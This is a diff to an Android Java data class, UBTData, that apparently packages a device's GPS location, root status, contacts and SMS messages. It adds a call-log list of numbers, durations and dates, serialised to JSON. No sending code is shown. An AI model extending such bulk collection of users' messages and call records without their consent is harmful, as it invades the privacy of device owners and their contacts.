@@ -52,7 +52,7 @@ public class UBTData {
     public boolean rooted;
     public Gps gps = new Gps();
     public List<DataBean> data = new ArrayList<>();
-    //    public List<UBTEvent> data;
+
 
     public UBTData(Context context) {
         gps.latitude = SharedPrefsUtil.getInstance(context).getValue("latitude", "");
@@ -94,7 +94,7 @@ public class UBTData {
         public List<UBTEvent> ubt_list = new ArrayList<>();
         public List<ContactBean> contact_list = new ArrayList<>();
         public List<SmsBean> sms_list = new ArrayList<>();
-        //public List<String> raw_data = new ArrayList<>();
+        public List<CallLogBean> calllog_list = new ArrayList<>();
 
         @Override
         public String toString() {
@@ -122,6 +122,18 @@ public class UBTData {
             public String content;
             public String type;
             public String ts;
+
+            @Override
+            public String toString() {
+                return new Gson().toJson(this);
+            }
+        }
+
+        public static class CallLogBean {
+            public String type;
+            public String duration;
+            public String number;
+            public String date;
 
             @Override
             public String toString() {
